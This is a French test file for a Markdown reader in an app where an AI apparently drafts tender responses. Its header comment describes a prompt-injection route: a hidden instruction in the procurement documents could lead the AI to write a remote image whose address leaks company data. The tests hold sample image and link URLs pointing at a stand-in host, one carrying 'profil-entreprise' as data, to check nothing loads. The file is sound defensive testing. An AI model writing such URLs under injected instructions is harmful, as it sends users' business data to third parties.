// P2-1 (REVUE-FRONT) : le mémoire en Markdown rendait une image distante (chargée à l'ouverture : une adresse peut porter
// des données, écrite par l'IA sous l'effet d'une consigne cachée dans le DCE) et un lien externe cliquable.
// Désormais : aucune image chargée (son texte alternatif à la place), aucun lien (son texte seul).
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { renderToStaticMarkup } from 'react-dom/server'
import LecteurMarkdown, { Cellule } from '@/components/memoire/LecteurMarkdown'

test('une image du mémoire n’est jamais chargée : son texte alternatif seulement', () => {
  const html = renderToStaticMarkup(<LecteurMarkdown text={'Voir ![schéma de principe](https://tiers.example/pixel.png?d=profil-entreprise) ici'} />)
  assert.doesNotMatch(html, /<img/i, html)
  assert.doesNotMatch(html, /tiers\.example/, html)
  assert.match(html, /schéma de principe/)
})

test('un lien externe du mémoire s’affiche en texte, sans adresse cliquable', () => {
  const html = renderToStaticMarkup(<LecteurMarkdown text={'[Formulaire de l’acheteur](https://tiers.example/connexion) et <https://tiers.example/b>'} />)
  assert.doesNotMatch(html, /<a\b/i, html)
  assert.doesNotMatch(html, /href=/i, html)
  assert.match(html, /Formulaire de l’acheteur/)
})

test('dans un tableau aussi : ni image ni lien', () => {
  const html = renderToStaticMarkup(<Cellule texte={'![logo](https://tiers.example/l.png) [site](https://tiers.example)'} />)
  assert.doesNotMatch(html, /<img|<a\b|tiers\.example/i, html)
  assert.match(html, /logo/)
  assert.match(html, /site/)
})

test('« À compléter » reste surligné', () => {
  const html = renderToStaticMarkup(<LecteurMarkdown text={'Effectif : [À COMPLÉTER : nombre de salariés]'} />)
  assert.match(html, /<mark class="a-renseigner">/, html)
})
